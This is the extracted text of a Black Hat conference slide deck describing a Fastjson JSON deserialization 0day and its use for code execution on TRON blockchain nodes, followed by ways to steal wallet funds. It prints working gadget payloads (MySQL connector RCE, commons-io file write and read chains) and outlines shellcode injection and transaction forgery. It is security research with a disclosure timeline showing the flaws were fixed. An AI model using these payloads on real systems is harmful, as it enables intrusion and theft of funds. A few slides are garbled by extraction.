How I use a JSON Deserialization 0day to Steal Your Money On The Blockchain
Ronny Xing & Zekai Wu
#BHUSA @BlackHatEvents

> Whoami
· Tencent Security Xuanwu Lab
· Applied and real world security research
· Ronny Xing( @RonnyX2017) · Zekai Wu( @hellowuzekai)
#BHUSA @BlackHatEvents

> Agenda
1. What is Fastjson 2. Fastjson Deserialize and Vulnerability 3. Find Gadgets to RCE and more 4. RCE on the Tron HTTP nodes 5. Post Penetration Exploit to Steal your Money 6. Conclusion

> Agenda
1. What is Fastjson 2. Fastjson Deserialize and Vulnerability 3. Find Gadgets to RCE and more 4. RCE on the Tron HTTP nodes 5. Post Penetration Exploit to Steal your Money 6. Conclusion

What is Fastjson
· JSON parser with 23'000+ stars on GitHub. · Widely used java basic component, known for its fast parsing speed · Two major security fixes about deserialization vulnerability in 2017 and 2018
3,600
Maven Artifacts using Fastjson

> Agenda
1. What is Fastjson 2. Fastjson Deserialize and Vulnerability 3. Find Gadgets to RCE and more 4. RCE on the Tron HTTP nodes 5. Post Penetration Exploit to Steal your Money 6. Conclusion

Deserialize
JavaBean
public class User { private String name;
public String getName() { return name;
}
public void setName(String name) { this.name = name;
} }
AutoType Default False JSONException:
autoType is not support

String name = "foo"; User u1 = new User(); u1.setName(name);
fastjson.JSON.toJSONString (u1,SerializerFeature.WriteClassName);
JSON: {"@type":"User","name":"foo"}
ParserConfig.getGlobalInstance() .setAutoTypeSupport(true); User user = (User)fastjson.JSON.parse("{...}"); System.out.print(user.getName());

Deserialize
JSON.parse(" {"@type": "User"} ");
scan Token Key "@type"
enter deserialization
checkAutoType(String typeName, Class<?> expectClass, int features)
check pass
ObjectDeserializer getDeserializer(Class<?> clazz, Type type)
select or create Deserializer for target type
Object createInstance( args from json )

Defense checkAutotype()

How to deserialize arbitrary classes? Bypass
checkAutoType(String typeName, Class<?> expectClass, int features)

{"@type": "User"}

Class "typeName" is Assignable From expectClass

Defense checkAutotype()

How to specify expectClass
· Explicit inheritance
{"@type":"I.am.ParentClass", "@type": "I.am.SubClass",

"abc":"foo", ...}

expectClass

typeName(Subclass) Args of Subclass

· Implicit inheritance

public class User { private Foo id;
public void setId(Foo id) { this.id = id;
} }

public class FooImpl implements Foo{ public String fooId;
}
{"@type":"User", "id":{"@type":"FooImpl","fooId":"abc"}}

Defense checkAutotype()
ParserConfig#checkAutoType(String typeName, Class<?> expectClass, int features)

1. In the whitelist

1. In the blacklist

2. In the deserializer cache

N 2. Inherit from

(TypeUtils.mappings)

RowSetDataSource

3. Class has @annotation

ClassLoader

fastjson.annotation.JSONType

Y Y

N expectClass != null, Object, Serializable, Closeable, ... Y
& class "typeName" is assignable from expectClass

Return N

N

Y

Config autoTypeSupport is false (default)

Throw error

& Cache

Defense checkAutotype()
Pass Autotype Check:
· Enable autotype support · Classes with annotation @JSONType · Classes in the whitelist (java AWT & spring framework) · Classes in the deserializer cache (TypeUtils.mappings) · Specify expected class (expectClass)

Deserializer cache

· Deserializer cache (TypeUtils.mappings) Initialized in

fastjson.util.TypeUtils#addBaseClassMappings()

For preloading the Deserializer of basic types

private static void addBaseClassMappings(){ mappings.put("byte", byte.class); mappings.put("short", short.class); mappings.put("int", int.class); ... mappings.put("[Z", boolean[].class); Class<?>[] classes = new Class[]{ Object.class, java.lang.Cloneable.class, ... } ... mappings.put(clazz.getName(), clazz);
}

Deserializer cache

· But the types in cache have their own Deserializer

java.lang.Exception.class, java.lang.RuntimeException.class, java.lang.IllegalAccessError.class, java.lang.IllegalAccessException.class, ...
java.util.HashMap.class, java.util.Hashtable.class, java.util.TreeMap.class, java.util.IdentityHashMap.class, ...

ThrowableDeserializer ...... NumberDeserializer DateCodec FloatCodec ...... MapDeserializer

· Except ...

Derivation ­ from which class
1. java.lang.AutoCloseable 2.java.util.BitSet
class inherit from them
checkAutoType(String typeName, Class<?> expectClass, int features)
Check pass
ObjectDeserializer getDeserializer(Class<?> clazz, Type type)

Default Deserializer fastjson.parser.deserializer.JavaBeanDeserializer

createJavaBeanDeserializer

createInstance

Derivation ­ from which class
· Which classes we can inherit:
· java.lang.AutoCloseable · java.util.BitSet · All the classes added to the cache during the deserialization
·Java.lang.AutoCloseable:
· Since jdk 1.7 · Super interface of xStream / xChannel / xConnection / ......

Bypass checkAutotype()

{"@type":"java.lang.AutoCloseable", "@type": "java.io.Reader"}

checkAutoType(String typeName, Class<?> expectClass, int features)
Check pass

ObjectDeserializer getDeserializer(Class<?> clazz, Type type)

Select by target type

deserializer.MapDeserializer deserializer.ThrowableDeserializer deserializer.EnumDeserializer serializer.DateCodec serializer.MiscCodec ......

Default type
ObjectDeserializer createJavaBeanDeserializer(clazz, type)

Object createInstance( args from json )

> Agenda
1. What is Fastjson 2. Fastjson Deserialize and Vulnerability 3. Find Gadgets to RCE and more 4. RCE on the Tron HTTP nodes 5. Post Penetration Exploit to Steal your Money 6. Conclusion

Find Gadgets
Which classes can be derived? Which methods can be called? (magic methods)
ObjectDeserializer createJavaBeanDeserializer(clazz, type)

createJavaBeanDeserializer

fastjson.util.JavaBeanInfo#build(Class<?> clazz, Type type, ...)

1. Select constructor
getDefaultConstructor / getCreatorConstructor

1. BuilderClass

2. Constructor without parameters (Default Constructor)

3. The Constructor scanned by reflection :

· First

· With maximum number of parameters

· Contains symbol

Random Order

createJavaBeanDeserializer

2. Setter
public void setXxx(Object arg1){}
3. Getter
public <?> getXxx(){}
The automatic call of getter during deserialization depends on the return type

Collection Map AtomicLong AtomicInteger AtomicBoolean

Derivation ­ which classes
Classes added to the cache(TypeUtils.mappings) during the deserialization
· Deserializing class itself · The types of the selected constructor parameters · The types of the Setter() parameters · The return types of the Getter()

Expand magic methods space
· JSONObject.toString() à JSON. toJSONString() à JSONSerializer
Call all getter()
· Proactively trigger this conversion process:
{"@type": "java.util.Currency","val":{"currency":{...ur payload...}}}
fastjson/serializer/MiscCodec.java:278
if (clazz == Currency.class) { String currency = jsonObject.getString("currency"); ...
}
{"@type": "java.util.concurrent.ConcurrentSkipListMap","abc":{...ur payload...}}

Expand magic methods space
· Fastjson feature "JSONPath" · You can use it as an Object Query Language(OQL) to query JSON object · Token Key " $ref "

{ "userObj": {"@type":"User", "name":"foo"},
"userName": { "$ref": "$.userObj.name" } }

Call getter
public String getName()

Expand magic methods space
So, by " $ref ", we can
1. call arbitrary getters 2. cross-reference and access the properties of instances during JSON parsing

Find Gadgets
· Gadgets Condition :
· Derived from java.lang.AutoCloseable · Have default constructor or constructor with symbol · NOT in the blacklist
· Gadgets Demand
· Can cause RCE, arbitrary file read and write, SSRF ... · Dependency classes of gadgets are in native JDK or widely used third-party libraries

Find Gadgets Automatically
· Reflection for checking derivation conditions · Visualization of derivation relations for reversing the chain from sink
· Tool for searching derivation :
https://gist.github.com/5z1punch/6bb00644ce6bea327f42cf72bc620b80
· Search gadgets classes in the JDK and the specified set of jars · Crawling common third party libraries from maven

Search Autotype Chain

Gadgets

Inherit from java.lang.AutoCloseable

1. Mysql connector RCE 2. Apache commons io read and write files 3. Jetty SSRF 4. Apache xbean-reflect RCE 5. ......

Gadgets
· Mysql connector 5.1.x
{"@type":"java.lang.AutoCloseable","@type":"com.mysql.jdbc.JDBC4Connection","hostToConn ectTo":"mysql.host","portToConnectTo":3306,"info":{"user":"user","password":"pass","sta tementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDese rialize":"true","NUM_HOSTS": "1"},"databaseToConnectTo":"dbname","url":""}
· Mysql connector 6.0.2 or 6.0.3
{"@type": "java.lang.AutoCloseable","@type": "com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection","proxy":{"connectionString":{"url": "jdbc:mysql://localhost:3306/foo?allowLoadLocalInfile=true"}}}
· Mysql connector 6.x or < 8.0.20
{"@type":"java.lang.AutoCloseable","@type":"com.mysql.cj.jdbc.ha.ReplicationMySQLConnecti on","proxy":{"@type":"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy","connectionUrl":{ "@type":"com.mysql.cj.conf.url.ReplicationConnectionUrl", "masters": [{"host":"mysql.host"}], "slaves":[], "properties":{"host":"mysql.host","user":"user","dbname":"dbname","password":"pass","quer yInterceptors":"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserial ize":"true"}}}}

> Agenda
1. What is Fastjson 2. Fastjson Deserialize and Vulnerability 3. Find Gadgets to RCE and more 4. RCE on the Tron HTTP nodes 5. Post Penetration Exploit to Steal your Money 6. Conclusion

JAVA-TRON
· TRON
· Public Blockchian · Crypto-Currency, known as TRX, native to the system · Market value: around US$5 billion. · Currency holders: 14.6 million. · 1,400 dApps on the TRON network, with a daily transaction volume of over
$12 million(2020/12/17).
· JAVA-TRON
· Public blockchain protocol launched by TRON. · HTTP services for interacting with the blockchain · Open source java application with 2.7k stars on github.
· https://github.com/tronprotocol/java-tron
· Using fastjson

Gadgets on JAVA-TRON

Gadgets Mysql Connector RCE
Commons IO read and write file Problems for exploit: 1. What to Write
2. Where to Write
3. How to Read
4. Without preconditions

No C/S database connector
Web
Spring boot fat jar Shell
Run with none root No direct resp by HTTP But broadcast on P2P network Take more nodes,Take more money

Write File
· Override system libs · Write JVM class path, such as charset.jar

· Root permission · Unknown path and version

· JNI in jar :
· The binary library files need to be released to the file system before it can be loaded · Always in java.io.tmpdir
·System.load(libfoo) à dlopen(libfoo.so)

Write File
· Leveldb and leveldbjni:
· A fast key-value storage library · Used by Bitcoin, therefore, is inherited by many public chain · Storage blockchain metadata, frequently polling for reading and writing · Need efficiency, so JNI https://github.com/fusesource/leveldbjni
· org.fusesource.hawtjni.runtime.Library#exractAndLoad
customPath = System.getProperty("java.io.tmpdir"); File target = extract(errors, resource, prefix, suffix, file(customPath));

Override shared lib at Runtime
Process1 dlopen(libfoo.so)

Disk
libfoo.so

mmap

Physical Memory
Page cache
libfoo.so

Process1

MMU mapping

Virtual memory libfoo.so

Override shared lib at Runtime

Process1 dlopen(libfoo.so) Meanwhile, Process2 open & write libfoo.so (or by direct IO)

Disk
libfoo.so

mmap sync
Maj Fault

Physical Memory
Page cache
libfoo.so

Process1

MMU mapping

Virtual memory libfoo.so

Direct IO Write

Write Process2

Read & Write JNI .so
· Get the random file name released by JNI jar
· No direct resp by HTTP but broadcast on P2P network
· Write binary bytes instead of string with encoding
· Input json string · Output stream and file writer

Read & Write ­ commons-io 2.x
WRITE
java.lang.AutoCloseable

READ

org.apache.commons.io.input.BOMInputStream(InputStream delegate, boolean include, ByteOrderMark... boms )

BOMInputStream#getBOM()

boolean matches(ByteOrderMark bom)

Field delegate.read()

Boms cmp with input.read()

org.apache.commons.io.input.TeeInputStream#read()
@Override public int read() throws IOException {
int ch = input.read(); if (ch != -1) {
branch.write(ch); } return ch; }

N
Return null
Blind Read

SAME ONE?
Y
Return bom

Write ­ commons-io 2.x
WRITE
java.lang.AutoCloseable
org.apache.commons.io.input.BOMInputStream(InputStream delegate, boolean include, ByteOrderMark... boms )
BOMInputStream#getBOM()
Field delegate.read()
org.apache.commons.io.input.TeeInputStream(InputStream input, OutputStream branch, boolean closeBranch)
@Override public int read() throws IOException {
int ch = input.read(); if (ch != -1) {
branch.write(ch); } return ch; }

Write String

· Field delegate à org.apache.commons.io.input.TeeInputStream

· Field input à org.apache.commons.io.input.CharSequenceInputStream

· Field cs à input string

> default bufsize 8192, auto flush

· Field branch à org.apache.commons.io.output.WriterOutputStream

· Field writer à org.apache.commons.io.output.FileWriterWithEncoding

· Field file à output file path

Write Binary
· Field delegate à org.apache.commons.io.input.TeeInputStream · Field input à org.apache.commons.codec.binary.Base64InputStream · Field in à input base64 str: commons.io.input.CharSequenceInputStream · Field branch à org.eclipse.core.internal.localstore.SafeFileOutputStream · Field targetPath à output file path
· commons-codec · AspectJ
· AOP for database backup

Read ­ commons-io 2.x
java.lang.AutoCloseable

READ

org.apache.commons.io.input.BOMInputStream(InputStream delegate, boolean include, ByteOrderMark... boms)

BOMInputStream#getBOM()

boolean matches(ByteOrderMark bom)

Compare Array Field boms with Field delegate.read()

N
Return null
Blind Read

SAME ONE?
Y
Return bom

Read Directory

{ "abc":{"@type": "java.lang.AutoCloseable", "@type": "org.apache.commons.io.input.BOMInputStream",
"delegate": {"@type": "org.apache.commons.io.input.ReaderInputStream",

Convert Reader to InputStream

"reader": { "@type": "jdk.nashorn.api.scripting.URLReader", "url": "file://tmp/"
}
},

Parameter url supports file:// scheme for a folder and listing directory

"boms": [ {bom1 bytes}, {bom2 bytes}, ...
]

Multiple bytes blocks to be compared with Reader output.
Use Binary Search

},

"address" : {"$ref":"$.abc.BOM"} }

abc.getBOM()

API /wallet/validateaddress

is null

No resp

bad format Validate failed message

Pointer Hijacking

org.tron.common.overlay.discover.node.NodeManager#channelActivated()

nodeManagerTasksTimer.scheduleAtFixedRate(new TimerTask() { @Override public void run() { dbWrite(); }
}, DB_COMMIT_RATE, DB_COMMIT_RATE);

public static final native long
org.fusesource.leveldbjni.internal.NativeBuffer $NativeBufferJNI#malloc(long size)

libleveldbjni.so # offset 0x197b0

Inject shellcode

Java_org_fusesource_leveldbjni_internal_NativeBuffer_00024NativeBufferJNI_malloc

Exploit
Extract

Recover Scheduled call
Pointer hijacking
Read random path Inject shellcode

Post-penetration

Part 2 Zekai Wu

> Agenda
1. What is Fastjson 2. Fastjson Deserialize and Vulnerability 3. Find Gadgets to RCE and more 4. RCE on the Tron nodes 5. Post Penetration Exploit to Steal your Money 6. Conclusion

How to Steal Your Money After RCE

51% Attack
· A 51% attack is an attack on a blockchain by a group of miners who control
more than 50% of the network's mining hash rate.
· Attackers with majority control of the network can interrupt the recording of new
blocks by preventing other miners from completing blocks.

Super Representatives
· TRON uses the super-representative mechanism.
· The top 27 candidates with the most votes are the super representatives.
· Super representatives generate blocks, package transactions and get block
rewards.

Tron Nodes

Limits
· As shown by tronscan.org , Tron has 1332 nodes in total.
· Only a quarter of the nodes can be accessed through the HTTP service.
· There is no guarantee that more than half of the super representatives have
enabled HTTP services.

Back to Tron HTTP Node
· The TRON HTTP node has a variety of API calls to allow users to interact with
the blockchain.
· Some of the API calls serve as stand-alone requests to get individual pieces of
information.
· There are also many API calls which modify the user TRX wallet, resulting in a
need to sign and broadcast the transaction.

Transaction Process
· Make a Transaction
/wallet/createtransaction return raw transaction in json format.
· Sign the Transaction
/wallet/gettransactionsign use the private key to sign the raw transaction
· Broadcast the Transaction
/wallet/broadcasttransaction broadcast signed transaction to blockchain

Forge `raw transaction` Steal `private key` DOS

TronLink Wallet
· TronLink is firstly launched at TRON's official website and backed by TRON
foundation.
· TronLink is the TRON wallet with the most users.
· TronLink has three versions (Chrome Wallet Extension/iOS/Android).

TronLink Wallet
· iOS/Android
Make a Transaction Sign the Transaction Broadcast Transaction
· Chrome Wallet Extension
Make a Transaction Sign the Transaction Broadcast Transaction

Attack Chrome Wallet Extension

Strigannstahcetifoanke

BtrroaSaneSdsncaedacnstdBitooEsnbivgi1ln01e00d0trxtrx

Demo

Demo
Why Chrome Wallet Extension has different behavior from iOS/Android

TronWeb Library
· TronWeb aims to deliver a unified, seamless development experience
influenced by Ethereum's Web3 implementation.
· TronWeb
Make a Transaction
tronWeb.transactionBuilder.sendTrx
Sign the Transaction
tronWeb.trx.sign
Broadcast Transaction
tronWeb.trx.sendRawTransaction

TronWeb Library
tronWeb.transactionBuilder.sendTrx
sendTrx(to = false, amount = 0, from = this.tronWeb.defaultAddress.hex, options, callback = false) {
// accept amounts passed as strings amount = parseInt(amount)
const data = { to_address: toHex(to), owner_address: toHex(from), amount: amount,
};
this.tronWeb.fullNode.request('wallet/createtransaction', data, 'post').then(transaction => resultManager(transaction, callback)).catch(err => callback(err));
}

TronWeb Library
· TronLink Chrome Wallet Extension · Multicurrency wallet · Dapps

Multicurrency Wallet
· Multicurrency wallet is a wallet that supports multiple cryptocurrency
transactions.
· imToken is a multi-currency wallet that supports Tron. · imToken has 12 million users. · imToken uses the TronWeb library.

Multicurrency Wallet

Dapp
· A decentralized application (Dapp) is a computer application that runs on a
distributed computing system like blockchain.
· 1,400 Dapps have been created on the TRON network, with a daily transaction
volume of over $12 million(2020/12/17).
· For a developer, Dapp is a combination of front-end and smart contracts.
· Tron provides TronWeb for front-end developer.

Dapp

Influence
· TronLink Chrome Wallet Extension
· 300,000 users.
· Multicurrency wallet
· imToken has 12 million users.
· Dapps
· 1,400 Dapps have been created on the TRON network, with a daily transaction volume of
over $12 million(2020/12/17).

> Agenda
1. What is Fastjson 2. Fastjson Deserialize and Vulnerability 3. Find Gadgets to RCE and more 4. RCE on the Tron nodes 5. Post Penetration Exploit to Steal your Money 6. Conclusion

Conclusion
· Blockchain is not the bulletproof to security vulnerability
· Further research for blockchain security
· Traditional web vulnerabilities · Cloud and Edge computing · Post Penetration Exploit

TimeLine
· Fastjson vulnerability timeline
· 2020-03 Vulnerability was discovered. · 2020-05-15 Vulnerability reported to vendor. · 2020-06-01 Vulnerability was fixed and fastjson version 1.2.69 was updated.
· Java-tron vulnerability timeline
· 2020-12 Vulnerability was discovered. · 2021-01-22 Vulnerability reported to vendor. · 2021-05-21 Vulnerability was fixed and java-tron version 4.2.1 was updated.

Special Thanks
· Kai Song @ExpSky · Junyu Zhou @md5_salt · Huiming Liu (@liuhm09) · Yang Yu @tombkeeper

Q&A

Thanks
Tencent Security Xuanwu Lab @XuanwuLab
xlab.tencent.com

